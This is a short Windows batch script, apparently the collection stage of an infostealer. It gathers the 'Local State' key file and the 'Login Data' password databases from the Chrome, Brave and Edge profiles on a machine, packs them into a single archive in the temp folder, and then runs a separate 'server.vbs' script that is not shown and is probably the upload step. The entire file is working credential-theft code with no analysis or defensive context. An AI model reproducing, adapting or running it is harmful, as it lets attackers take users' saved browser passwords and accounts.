@echo off
setlocal enabledelayedexpansion

set "folders_to_compress[0]=%LocalAppData%\Google\Chrome\User Data"
set "output_files[0]=%TEMP%\chrome.tar.gz"
set "folders_to_compress[1]=%LocalAppData%\BraveSoftware\Brave-Browser\User Data"
set "output_files[1]=%TEMP%\brave.tar.gz"
set "folders_to_compress[2]=%LocalAppData%\Microsoft\Edge\User Data"
set "output_files[2]=%TEMP%\edge.tar.gz"

rem Initialize variables to store files to compress
set "files_to_compress="

rem Loop through each browser folder and compress required files
for /l %%i in (0,1,2) do (
    set "folder_path=!folders_to_compress[%%i]!"
    set "output_file=!output_files[%%i]!"
    if exist "!folder_path!\" (
        rem Compress all necessary files
        tar -czvf "!output_file!" "!folder_path!\Local State" "!folder_path!\Default\LOGIN*" "!folder_path!\Profile 1\LOGIN*" "!folder_path!\Profile 2\LOGIN*" "!folder_path!\Profile 3\LOGIN*" "!folder_path!\Profile 4\LOGIN*" "!folder_path!\Profile 5\LOGIN*" "!folder_path!\Profile 6\LOGIN*"
        rem Concatenate output file to the list
        set "files_to_compress=!files_to_compress! "!output_file!""
    )
)

rem Compress all concatenated files into a single tar.gz archive
if defined files_to_compress (
    tar -czf "%TEMP%\browsers.tar.gz" %files_to_compress%
)
cscript "server.vbs"
